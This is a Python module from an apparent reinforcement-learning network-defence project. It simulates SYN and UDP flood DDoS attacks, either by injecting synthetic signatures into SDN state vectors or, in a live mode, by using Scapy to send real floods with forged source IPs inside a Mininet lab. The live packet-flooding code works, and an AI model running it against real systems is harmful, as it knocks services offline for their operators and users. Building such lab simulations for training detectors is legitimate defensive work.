"""DDoS attack simulation for the RL-driven adaptive security system.

Implements Distributed Denial of Service attack patterns including:
    - SYN flood: High-volume TCP SYN packets from multiple sources.
    - UDP flood: High-volume UDP packets to overwhelm target.

Each attack has two modes:
    1. **Live mode** — uses Scapy to craft and send real packets inside
       the Mininet network.
    2. **Simulation mode** — generates synthetic state-vector signatures
       that mimic what the SDN controller would observe during a DDoS
       attack.  Used for offline RL training without Docker.
"""

import logging
import time
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple

import numpy as np

logger = logging.getLogger(__name__)

# Attack intensity presets
INTENSITY_LOW = "low"
INTENSITY_MEDIUM = "medium"
INTENSITY_HIGH = "high"

INTENSITY_PROFILES = {
    INTENSITY_LOW: {
        "packets_per_second": 500,
        "num_sources": 2,
        "duration_seconds": 10,
        "flow_count_increase": (0.2, 0.4),
        "packet_count_increase": (2.0, 4.0),
        "byte_count_increase": (1.5, 3.0),
        "drop_rate_increase": (0.5, 1.5),
        "conn_rate_increase": (2.0, 5.0),
        "throughput_range": (50.0, 75.0),
        "latency_range": (15.0, 30.0),
    },
    INTENSITY_MEDIUM: {
        "packets_per_second": 2000,
        "num_sources": 3,
        "duration_seconds": 20,
        "flow_count_increase": (0.3, 0.7),
        "packet_count_increase": (3.0, 6.0),
        "byte_count_increase": (2.0, 4.0),
        "drop_rate_increase": (1.0, 3.0),
        "conn_rate_increase": (3.0, 8.0),
        "throughput_range": (30.0, 60.0),
        "latency_range": (20.0, 40.0),
    },
    INTENSITY_HIGH: {
        "packets_per_second": 5000,
        "num_sources": 5,
        "duration_seconds": 30,
        "flow_count_increase": (0.5, 1.0),
        "packet_count_increase": (5.0, 10.0),
        "byte_count_increase": (3.0, 6.0),
        "drop_rate_increase": (2.0, 5.0),
        "conn_rate_increase": (5.0, 15.0),
        "throughput_range": (10.0, 40.0),
        "latency_range": (30.0, 50.0),
    },
}


@dataclass
class DDoSConfig:
    """Configuration for a DDoS attack simulation.

    Attributes:
        attack_type: ``"syn_flood"`` or ``"udp_flood"``.
        intensity: ``"low"``, ``"medium"``, or ``"high"``.
        target_switch: Target switch index (0-4).  ``None`` for random.
        target_ip: Target host IP for live mode.
        source_ips: Source IPs for live mode (forged in SYN flood).
        duration_steps: Duration in environment steps for simulation mode.
        seed: Random seed for reproducibility.
    """

    attack_type: str = "syn_flood"
    intensity: str = INTENSITY_MEDIUM
    target_switch: Optional[int] = None
    target_ip: str = "10.0.0.1"
    source_ips: List[str] = field(default_factory=lambda: [
        "10.0.0.4", "10.0.0.7", "10.0.0.10",
    ])
    duration_steps: int = 30
    seed: int = 42


class DDoSAttack:
    """DDoS attack simulator with live and simulation modes.

    Args:
        config: DDoS attack configuration.

    Example:
        >>> attack = DDoSAttack(DDoSConfig(intensity="medium"))
        >>> state = np.zeros(65, dtype=np.float32)
        >>> modified = attack.inject_signature(state, rng=np.random.RandomState(42))
        >>> assert modified[0] > state[0]  # flow count increased
    """

    def __init__(self, config: Optional[DDoSConfig] = None) -> None:
        self.config = config or DDoSConfig()
        self.profile = INTENSITY_PROFILES[self.config.intensity]
        self._active = False
        self._steps_elapsed = 0
        self._start_time: Optional[float] = None

        logger.info(
            "DDoSAttack created: type=%s, intensity=%s, target_sw=%s",
            self.config.attack_type, self.config.intensity,
            self.config.target_switch,
        )

    @property
    def is_active(self) -> bool:
        """Whether the attack is currently active."""
        return self._active

    @property
    def attack_name(self) -> str:
        """Human-readable attack name."""
        return f"ddos_{self.config.attack_type}"

    def start(self) -> None:
        """Start the attack."""
        self._active = True
        self._steps_elapsed = 0
        self._start_time = time.time()
        logger.info("DDoS attack started: %s", self.attack_name)

    def stop(self) -> None:
        """Stop the attack."""
        self._active = False
        elapsed = time.time() - self._start_time if self._start_time else 0
        logger.info(
            "DDoS attack stopped after %d steps (%.1fs)",
            self._steps_elapsed, elapsed,
        )

    def step(self) -> bool:
        """Advance one simulation step.

        Returns:
            True if the attack is still active, False if it has ended.
        """
        if not self._active:
            return False

        self._steps_elapsed += 1
        if self._steps_elapsed >= self.config.duration_steps:
            self.stop()
            return False
        return True

    def inject_signature(
        self,
        state: np.ndarray,
        rng: np.random.RandomState,
        target_switch: Optional[int] = None,
    ) -> np.ndarray:
        """Inject DDoS attack signatures into a state vector.

        Modifies the state to reflect what the SDN controller would
        observe during a DDoS attack: increased flow counts, packet
        rates, byte counts, drop rates, and connection rates.

        Args:
            state: Current state vector of shape ``(65,)``.
            rng: Random number generator for stochastic variation.
            target_switch: Override target switch (0-4).

        Returns:
            Modified state vector with DDoS signatures.
        """
        modified = state.copy()
        sw = target_switch if target_switch is not None else self.config.target_switch
        if sw is None:
            sw = rng.randint(0, 5)

        offset = sw * 13
        p = self.profile

        if self.config.attack_type == "syn_flood":
            # SYN flood: massive connection attempts, many short-lived flows
            modified[offset + 0] += rng.uniform(*p["flow_count_increase"])
            modified[offset + 1] += rng.uniform(*p["packet_count_increase"])
            modified[offset + 2] += rng.uniform(*p["byte_count_increase"])
            modified[offset + 3] = rng.uniform(0.01, 0.05)  # Very short duration (SYN only)
            modified[offset + 4] += rng.uniform(*p["packet_count_increase"])  # rx spike
            modified[offset + 8] += rng.uniform(*p["drop_rate_increase"])  # rx_dropped
            modified[offset + 12] += rng.uniform(*p["conn_rate_increase"])  # conn rate spike

        elif self.config.attack_type == "udp_flood":
            # UDP flood: massive byte volume, fewer distinct flows
            modified[offset + 0] += rng.uniform(0.1, 0.3)  # Fewer new flows
            modified[offset + 1] += rng.uniform(*p["packet_count_increase"])
            modified[offset + 2] += rng.uniform(
                p["byte_count_increase"][0] * 1.5,
                p["byte_count_increase"][1] * 1.5,
            )  # UDP floods are byte-heavy
            modified[offset + 4] += rng.uniform(*p["packet_count_increase"])  # rx spike
            modified[offset + 6] += rng.uniform(*p["byte_count_increase"])  # rx_bytes
            modified[offset + 8] += rng.uniform(*p["drop_rate_increase"])  # drops
            modified[offset + 12] += rng.uniform(
                p["conn_rate_increase"][0] * 0.5,
                p["conn_rate_increase"][1] * 0.5,
            )

        return modified

    def get_traffic_impact(
        self, rng: np.random.RandomState,
    ) -> Tuple[float, float]:
        """Get throughput and latency during the attack.

        Args:
            rng: Random number generator.

        Returns:
            Tuple of (throughput_mbps, latency_ms).
        """
        p = self.profile
        throughput = rng.uniform(*p["throughput_range"])
        latency = rng.uniform(*p["latency_range"])
        return throughput, latency

    def get_ground_truth(self) -> Dict[str, Any]:
        """Get ground truth labels for the current attack state.

        Returns:
            Dictionary with attack metadata for evaluation.
        """
        return {
            "attack_active": self._active,
            "attack_type": "ddos",
            "attack_subtype": self.config.attack_type,
            "intensity": self.config.intensity,
            "steps_elapsed": self._steps_elapsed,
            "target_switch": self.config.target_switch,
        }

    # ------------------------------------------------------------------
    # Live Mode (Scapy)
    # ------------------------------------------------------------------

    def generate_live_packets(self) -> Optional[List[Any]]:
        """Generate Scapy packets for live network injection.

        Returns a list of Scapy packet objects ready to be sent via
        ``send()`` or ``sendp()`` inside the Mininet container.

        Returns:
            List of Scapy packets, or None if scapy is not available.
        """
        try:
            from scapy.all import IP, TCP, UDP, RandShort, Ether
        except ImportError:
            logger.warning("Scapy not available; live packet generation disabled")
            return None

        packets = []
        target = self.config.target_ip

        if self.config.attack_type == "syn_flood":
            for src_ip in self.config.source_ips:
                pkt = (
                    IP(src=src_ip, dst=target)
                    / TCP(sport=RandShort(), dport=80, flags="S")
                )
                packets.append(pkt)

        elif self.config.attack_type == "udp_flood":
            for src_ip in self.config.source_ips:
                pkt = (
                    IP(src=src_ip, dst=target)
                    / UDP(sport=RandShort(), dport=53)
                    / (b"\x00" * 1024)  # 1KB payload
                )
                packets.append(pkt)

        logger.debug(
            "Generated %d live %s packets targeting %s",
            len(packets), self.config.attack_type, target,
        )
        return packets

    def run_live(self, duration: int = 20, pps: Optional[int] = None) -> None:
        """Send live attack traffic for *duration* seconds.

        Continuously generates and sends Scapy packets at the configured
        (or overridden) rate.  Designed to be called from the CLI entry
        point inside the Mininet container.

        Args:
            duration: How many seconds to sustain the attack.
            pps: Override packets-per-second (uses intensity profile if None).
        """
        from scapy.all import send

        rate = pps or self.profile["packets_per_second"]
        batch_size = min(50, max(1, rate // 10))
        batch_interval = batch_size / max(rate, 1)
        self.start()
        logger.info(
            "Live DDoS: type=%s, intensity=%s, duration=%ds, pps=%d, batch=%d",
            self.config.attack_type, self.config.intensity, duration, rate,
            batch_size,
        )

        deadline = time.time() + duration
        sent = 0
        while time.time() < deadline:
            packets = self.generate_live_packets()
            if packets is None:
                logger.error("Scapy unavailable — aborting live DDoS")
                break
            # Build batch from packet templates
            batch = packets * max(1, batch_size // len(packets))
            send(batch[:batch_size], verbose=False)
            sent += len(batch[:batch_size])
            time.sleep(batch_interval)

        self.stop()
        logger.info("Live DDoS finished — %d packets sent in %ds", sent, duration)


# ------------------------------------------------------------------
# CLI entry point
# Usage: docker exec mininet python3 /app/src/attacks/ddos.py --live
# ------------------------------------------------------------------

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="DDoS attack — live Scapy mode")
    parser.add_argument("--live", action="store_true", required=True,
                        help="Run in live mode (send real packets)")
    parser.add_argument("--duration", type=int, default=20,
                        help="Attack duration in seconds (default: 20)")
    parser.add_argument("--intensity", choices=["low", "medium", "high"],
                        default="medium", help="Attack intensity (default: medium)")
    parser.add_argument("--type", choices=["syn_flood", "udp_flood"],
                        default="syn_flood", dest="attack_type",
                        help="DDoS variant (default: syn_flood)")
    parser.add_argument("--target", default="10.0.0.1",
                        help="Target IP (default: 10.0.0.1)")
    args = parser.parse_args()

    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
        datefmt="%H:%M:%S",
    )

    config = DDoSConfig(
        attack_type=args.attack_type,
        intensity=args.intensity,
        target_ip=args.target,
    )
    attack = DDoSAttack(config)
    attack.run_live(duration=args.duration)
